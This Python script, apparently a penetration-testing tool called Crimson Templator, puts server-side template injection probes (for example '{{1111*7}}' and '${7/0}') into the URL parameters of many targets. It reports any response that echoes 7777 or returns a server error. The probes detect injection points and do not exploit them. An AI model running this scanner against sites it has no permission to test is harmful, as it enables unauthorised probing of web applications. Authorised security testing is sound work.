# coding: utf-8
#
### CREATED BY KARMAZ
#
#
### FUNCTIONS:
#
# 1. CHECK FOR SSTI STRING 7777 IN RESPONSE TEXT
#   a) ${1111*7}
#   b) <%= 1111*7 %>
#   c) {{1111*7}}
#   d) #1111*7
# 2. CHECK FOR INTERNAL ERROR 500 STATUS CODE IN RESPONSE
#   a) ${7/0}
#   b) {{7/0}}
#   c) <%= 7/0 %>
#   d) ``
#   e) ${{<%[%'"}}%\.
###
#
# USAGE EXAMPLE:
#   python crimson_templator.py -w urls.txt -c "Cookie: auth1=qwe; auth2=asd;" -H "asd=1" -H "qwe=2"

import sys, getopt, requests, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from tqdm import tqdm
from urllib.parse import urlparse
from urllib.parse import urlunparse 
### OPTIONS ---
argument_list = sys.argv[1:]
short_options = "w:c:H:o:h"
long_options = ["wordlist", "cookies", "header", "output", "help"]
try:
    arguments, values = getopt.getopt(argument_list, short_options, long_options)
except getopt.error as err:
    print(err)
    sys.exit(2)
### --- (They will be iterated at the bottom of the screen ---

def helper():
    '''Print usage in case of wrong options or arguments being used'''
    print("""\033[0;31m
████████╗███████╗███╗   ███╗██████╗ ██╗      █████╗ ████████╗ ██████╗ ██████╗ 
╚══██╔══╝██╔════╝████╗ ████║██╔══██╗██║     ██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
   ██║   █████╗  ██╔████╔██║██████╔╝██║     ███████║   ██║   ██║   ██║██████╔╝
   ██║   ██╔══╝  ██║╚██╔╝██║██╔═══╝ ██║     ██╔══██║   ██║   ██║   ██║██╔══██╗
   ██║   ███████╗██║ ╚═╝ ██║██║     ███████╗██║  ██║   ██║   ╚██████╔╝██║  ██║
   ╚═╝   ╚══════╝╚═╝     ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝\033[0m""")
    print("\nUSAGE: python crimson_templator.py -w [wordlist_with_urls] -H [headers] -c [Cookie: a=1;] -h [show help]")


def load_wordlist(wordlist_filepath):
    '''Importing wordlist line by line into an array'''
    with open(wordlist_filepath) as f:
        new_wordlist = [",".join(line.split(",")).strip() for line in f.readlines()]
    return new_wordlist


def import_cookies(cookie):
    '''Importing cookies from header f.e. "Cookie: auth1=qwe; auth2=asd;" '''
    cookies = {}
    #cookie_header = cookie.split(":")[0]
    cookie_values = cookie.split(":")[1].split(";")[:-1]
    for q in cookie_values:
        cookies.update(dict([q.lstrip().split("=")]))
    return cookies


def paramjuggler(url,payload):
    '''Return all possible mutations of parameter values of the given url and payload'''
    new_urls = []
    parsed=urlparse(url)
    queries=parsed.query.split("&")
    for i,query in enumerate(queries):
        result = []
        new_queries = []
        new_queries = queries[:]
        new_parsed = ""
        #Extract the param from query
        param=(queries[i].split("=")[0] + "=")
        new_param=param+payload
        new_queries[i] = new_param
        new_parsed = parsed._replace(query="&".join(new_queries))
        result.append(urlunparse(new_parsed))
        new_urls.append("".join(result).rstrip())
    return new_urls


def check_ssti_string_based(urls, cookies, headers):
    output_list = []
    armed_urls = []
    '''Swap parameter values in the URL string and check for string or internal error'''
    ssti_payloads_7777 = [
    "${1111*7}",
    "<%= 1111*7 %>",
    "{{1111*7}}",
    "1111*7"
    ]            

    s = requests.Session()
    s.cookies.update(cookies)
    s.headers.update(headers)

    for url in urls:
        for payload in ssti_payloads_7777:
            armed_urls += paramjuggler(url,payload)
    
    for armed_url in tqdm(armed_urls):   
        r1 = s.get(armed_url, allow_redirects=True, verify=False)
        if "7777" in r1.text:
            output_list.append("[+] 7777 INJECTION FOUND: " + r1.url + " - L="+ str(len(r1.content)))
    return output_list


def check_ssti_error_based(urls, cookies, headers):
    output_list = []
    armed_urls = []
    ssti_payloads_error = [
    "${7/0}",
    "{{7/0}}",
    "<%= 7/0 %>",
    "``",
    "${{<%[%'\"}}%\."
    ]

    s = requests.Session()
    s.cookies.update(cookies)
    s.headers.update(headers)

    for url in urls:
        for payload in ssti_payloads_error:
            armed_urls += paramjuggler(url,payload)
    
    for armed_url in tqdm(armed_urls):
        r1 = s.get(armed_url, allow_redirects=True, verify=False)
        if r1.status_code == 500:
            output_list.append("[+] INTERNAL ERROR FOUND: " + r1.url + " - L="+ str(len(r1.content)))
    return output_list


def logs_saver(logs_list, logs_name):
    with open(logs_name, 'w') as f:
        for log in logs_list:
            #print >> f, log
            f.write(log+"\n")

### OPTIONS ---
headers = {}
cookies ={}
show_help = False
try: logs_name
except NameError: logs_name = None
for current_argument, current_value in arguments:
    if current_argument in ("-w", "--wordlist"):
        list_of_urls = current_value
    elif current_argument in ("-c", "--cookies"):
        cookies = current_value
    elif current_argument in ("-H", "--header"):
        headers.update([current_value.split("=")])
    elif current_argument in ("-o", "--output"):
        logs_name = current_value
    elif current_argument in ("-h", "--help"):
        show_help = True

### MAIN
if __name__ == '__main__':
    if show_help:
        helper()
    else:
        urls = load_wordlist(list_of_urls)
        if cookies:
            cookies = import_cookies(cookies)
        print("\033[0;31m [+]\033[0m STARTING SSTI INJECTIONS")
        print("\033[0;31m [++]\033[0m CHECKING STRING BASED INJECTIONS")
        output_list = check_ssti_string_based(urls, cookies, headers)
        print("\033[0;31m [++]\033[0m CHECKING ERROR BASED INJECTIONS")
        output_list += check_ssti_error_based(urls, cookies, headers)
        if logs_name is not None:
            if output_list:
                logs_saver(output_list, logs_name)
        else:
            for element in output_list:
                print(element.rstrip())
